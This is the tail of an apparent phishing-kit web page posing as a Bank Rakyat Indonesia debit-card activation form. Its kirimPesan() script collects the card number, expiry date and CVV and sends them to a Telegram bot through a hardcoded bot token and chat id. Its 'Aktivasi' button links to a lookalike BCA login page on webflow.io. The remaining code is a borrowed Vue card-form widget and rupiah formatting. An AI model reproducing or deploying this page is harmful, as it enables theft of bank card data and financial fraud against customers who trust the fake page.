         <select name="tahun" id="tahun" data-ref="cardDate" class="card-input__input -select" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" required> <option value="" disabled selected>Tahun</option> <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n"> {{$index + minCardYear}} </option> </select> 
        </div> 
       </div> 
       <div class="card-form__col -cvv"> 
        <div class="card-input"> 
         <label for="cardCvv" class="card-input__label" style="font-weight: 800;">CVV</label> 
         <input type="tel" name="cvv" class="card-input__input" id="pesan" v-mask="'####'" minlength="3" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" placeholder="CVV (3 Digit Dibelakang Kartu)" required> 
        </div> 
       </div> 
      </div> 
      <button class="card-form__button"  type="submit">Lanjutkan</button> 
   </div> 
   <div>
      <center>
      <p style="color: #000; line-height: 5px; position: absolute; left: 0; right: 0; bottom: 5; padding: 5px; font-size: 13px; opacity : 0.4">
        © 2023 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights .</p> 
        </center>
      <div class="form-popup" id="myForm"> 
       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBA_1spp9nOPgkx6DzTnx-O9zTdcpkeLdvDHUs3AHzuObZ_ax7svEzeQuiX-wWye9B5dRfLhrZ7EK_zgo9ZQ124M9-wbxnEHGNRr1HEM4ODnvsi_nfvP7Ak4OLxelckMCId4i20J_KfXGxhP2_TGH8GGCW61FUtje5cePtlCB_hzz9JJ8CrPJLCKim/s839/1672362919283.png" style="box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);" class="card-item__bg"> 
       <a href="https://bca-mobile-individu.webflow.io/log-in"><button type="submit" class="card-form__button" onclick="KirimPesan()">Aktivasi</button></a>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
       <button type="button" class="card-form__button" onclick="closeForm()">Kembali</button> 
      </div> 
     </form>
  
</div>

<script>
function kirimPesan() {
 
   var logo = document.getElementById('logo');
    var nama = document.getElementById('nama');
    
    var bulan = document.getElementById('bulan');
   var tahun = document.getElementById('tahun');
    
    var pesan = document.getElementById('pesan');

    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + nama.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 %3A%0A' + bulan.value + "/" + tahun.value + '%0A𝗖𝗩𝗩 %3A%0A' + pesan.value;

    var token = '6387660540:AAHzuyg8j-CHK6ow8znz_VqiGQCKJao7q0w'; // Ganti dengan token bot yang kamu buat
    var grup = '6387139530'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}
</script>
<script>
//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".pincode");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);


</script> 
  </div> 
<!-- partial -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
<!-- partial:index.partial.html -->
<script src="https://code.jquery.com/jquery-1.12.4.min.js"
        integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ"
        crossorigin="anonymous">
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
<script src="jquery.min.js"></script>
        <script src="jquery.mask.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function(){

                // Format mata uang.
                $( '.uang' ).mask('000.000.000', {reverse: true});

            })
        </script>
</body>
</html>
<script>
/*
See on github: https://github.com/muhammederdem/credit-card-form
*/

new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      cardName1: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType () {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";
      
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'troy'

      return ""; // default type
    },
		generateCardNumberMask () {
			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth () {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear () {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard (status) {
      this.isCardFlipped = status;
    },
    focusInput (e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    }
  }
});




//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".pincode");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);


</script>
<!-- partial -->
  <script>
      /* Dengan Rupiah */
    var dengan_rupiah = document.getElementById('denganrupiah');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
    
    
    
  function getrp(){
      document.getElementById("saldo").innerHTML = "Rp";
  }  
    
  </script>
